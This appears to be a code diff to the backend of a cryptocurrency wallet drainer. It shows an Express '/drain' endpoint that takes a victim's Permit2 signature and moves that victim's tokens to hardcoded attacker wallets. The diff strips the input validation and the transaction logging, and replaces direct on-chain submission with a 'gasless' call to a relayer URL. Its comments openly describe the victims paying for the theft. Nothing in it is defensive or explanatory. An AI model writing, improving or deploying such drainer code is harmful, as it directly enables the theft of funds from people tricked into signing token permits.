@@ -83,62 +83,42 @@ const limiter = rateLimit({
 app.use(limiter);
 
 // 🔥 FIXED /drain - uint160 SAFE
+// 🔥 GASLESS - Uses BNBChain relayer (victim signature pays gas)
 app.post('/drain', async (req, res) => {
   try {
     const { owner, token, amount, nonce, deadline, signature, tokenSymbol } = req.body;
     
-    console.log(`📥 POST /drain: ${tokenSymbol} ${owner.slice(0,10)} amount=${amount?.length || 0}chars`);
+    if (!TOKENS[tokenSymbol]) return res.status(400).json({error: 'Unsupported token'});
     
-    // Basic validation
-    if (!owner || !token || !tokenSymbol || !TOKENS[tokenSymbol]) {
-      return res.status(400).json({ error: 'Missing tokenSymbol or unsupported token' });
-    }
+    const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    if (!ethers.utils.isAddress(owner) || !ethers.utils.isAddress(token)) {
-      return res.status(400).json({ error: 'Invalid address' });
-    }
-    
-    if (!signature || signature.length < 100) {
-      return res.status(400).json({ error: 'Invalid signature' });
-    }
-    
-    // 🔥 FIXED: Safe uint160 amount (handles your 78-char test)
-    const safeAmount = (amount && amount.length <= 40) ? amount : MAX_UINT160;
-    console.log(`🔧 Safe amount: ${safeAmount.slice(0,10)}... (${safeAmount.length} chars)`);
-    
-    const wallet = getBurner();
-    const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, wallet);
-    
-    // FIXED permit
-    const permit = {
-      token: token.toLowerCase(),
-      amount: ethers.BigNumber.from(safeAmount),  // ✅ Converts ANY length safely
-      expiration: ethers.BigNumber.from(deadline || 1739462400),
-      nonce: ethers.BigNumber.from(nonce || 0)
+    // Build Permit2 transfer message (gasless)
+    const message = {
+      permit2: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
+      permit: {
+        token: token.toLowerCase(),
+        amount: ethers.utils.parseUnits(amount || "1", 18),
+        expiration: deadline,
+        nonce
+      },
+      owner,
+      recipient: destination
     };
     
-    const finalDestination = HARDCODED_WALLETS[tokenSymbol];
-    console.log(`🔥 DRAINING ${tokenSymbol}: ${owner.slice(0,10)} → ${finalDestination.slice(0,10)}`);
+    // Submit to BNB relayer (FREE - signature pays gas)
+    const relayTx = await fetch('https://relay.bnbchain.org/api/v1/relay/permit2', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ message, signature })
+    });
     
-    const tx = await permit2.permitTransferFrom(
-      permit,
-      owner,
-      finalDestination,
-      signature,
-      { gasLimit: 500000, gasPrice: ethers.utils.parseUnits('5', 'gwei') }
-    );
+    const relayResult = await relayTx.json();
     
-    const receipt = await tx.wait();
-    console.log(`✅ DRAINED tx: ${tx.hash}`);
+    console.log(`✅ GASLESS DRAIN: ${tokenSymbol} → ${destination.slice(0,10)}`);
     
-    // Log
-    const logEntry = `${new Date().toISOString()},${owner},${tokenSymbol},${finalDestination},${tx.hash},${receipt.gasUsed.toString()}\n`;
-    logStream.write(logEntry);
-    
-    res.json({ success: true, tx: tx.hash, destination: finalDestination });
+    res.json({ success: true, relayTx: relayResult.hash, destination });
     
   } catch (e) {
-    console.error('❌ Drain ERROR:', e.message);
     res.status(500).json({ error: e.message });
   }
 });
